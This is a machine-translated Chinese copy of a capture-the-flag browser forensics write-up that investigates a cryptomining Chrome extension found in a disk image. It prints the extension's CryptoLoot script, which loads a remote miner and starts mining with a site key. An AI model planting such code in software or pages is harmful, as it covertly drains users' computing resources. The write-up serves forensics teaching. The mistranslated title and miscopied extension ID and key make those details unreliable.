# 传感器浏览器—密码浏览器

> 原文：<https://infosecwriteups.com/browser-forsensics-cyptominer-49e5beeb4433?source=collection_archive---------1----------------------->

# 挑战描述

→我们的 SOC 发出警报，有一些流量来自一台刚刚加入网络的电脑，与加密挖掘相关。事件响应团队立即采取行动，发现流量来自浏览器应用程序。使用 FTK 成像仪收集所有关键浏览器数据后，您需要使用 ad1 文件来调查加密挖掘活动。

*   **ADI(accessdataimage)磁盘镜像文件包含取证工具包镜像数据。**

1.  **谷歌浏览器中有多少浏览器配置文件？**

→ **2**

```
C:\Documents and Settings\”USER NAME”\Local Settings\Application Data\Google\Chrome\User Data\Default\Profile 1\Extensions
```

— — — — — — — — — — — — — — — — — — — — — — — — — —

**2。谷歌 Chrome 上安装的浏览器主题叫什么？** → **太空中的地球** **偏好**:

```
"theme":{
"id":"iiihlpikmpijdopbaegjibndhpgjmjfe",
"pack":"C:\\\\Users\\\\IEUser\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\iiihlpikmpijdopbaegjibndhpgjmjfe\\\\1.6_0"
}
```

[https://chrome.google.com/webstore/detail/земля-в-космосе/iiihlpikmpijdopbaegjibndhpgjmjfe](https://chrome.google.com/webstore/detail/%D0%B7%D0%B5%D0%BC%D0%BB%D1%8F-%D0%B2-%D0%BA%D0%BE%D1%81%D0%BC%D0%BE%D1%81%D0%B5/iiihlpikmpijdopbaegjibndhpgjmjfe)

— — — — — — — — — — — — — — — — — — — — — — — — — —

**3。识别加密程序的扩展名 ID 和扩展名**

```
"ids": [
        "aapocclcgogkmnckokdopfmhonfmgoek",
        "aohghmighlieiainnegkcijnfilokake",
        "egnfmleidkolminhjlkaomjefheafbbb",
        "felcaaldnbdncclmgdcncolpebgiejap",
        "ghbmnnjooekpmoecnnnilnnbdlolhkhi",
        "iiihlpikmpijdopbaegjibndhpgjmjfe",
        "kbfnbcaeplbcioakkpcpgfkobkghlhen",
        "pgjjikdiikihdfpoppgaidccahalehjh",
        "pkedcjkdefgpdelpbcmbmeomcjbeemfm"
      ],
```

→egnfmleidkolminjlkaomjefheafbbb，DFP 加密货币挖掘器

```
<script src="<https://crypto-loot.com/lib/miner.min.js>"></script>
<script>
var miner=new CryptoLoot.Anonymous('b23efb4650150d5bc5b2de6f05267272cada06d985a0',
        {
        threads:3,autoThreads:false,throttle:0.2,
        }
);
miner.start();
</script>
<script>
	// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ }) // Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond(20);
		var totalHashes = miner.getTotalHashes(256000000);
		var acceptedHashes = miner.getAcceptedHashes(); // Output to HTML elements...
	}, 1000);
</script>
```

— — — — — — — — — — — — — — — — — — — — — — — — — —

**4。这个扩展的描述文本是什么？**

→允许员工在其网络浏览器的后台挖掘加密货币

— — — — — — — — — — — — — — — — — — — — — — — — — —

**5。浏览器扩展中使用的特定 javascript web miner 的名称是什么？**

**→ CryptoLoot**

— — — — — — — — — — — — — — — — — — — — — — — — — —

6。crypto miner 每秒计算多少散列？

→ 20

— — — — — — — — — — — — — — — — — — — — — — — — — —

7。与此挖掘活动相关联的公钥是什么？

→b 23 efb 4650150 D5 BC 5 de 6 f 05267272 cada 06d 985 a 0

— — — — — — — — — — — — — — — — — — — — — — — — — —

8。javascript web miner 的官方 Twitter 页面的 URL 是什么？

→[twitter.com/cryptolootminer](http://twitter.com/cryptolootminer)

谢谢:)

# 🔈 🔈Infosec Writeups 正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有 16 个令人难以置信的演讲者和 10 多个小时充满力量的讨论会议。查看更多详情并在此注册。

[](https://iwcon.live/) [## IWCon2022 - Infosec 书面报告虚拟会议

### 与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…

iwcon.live](https://iwcon.live/)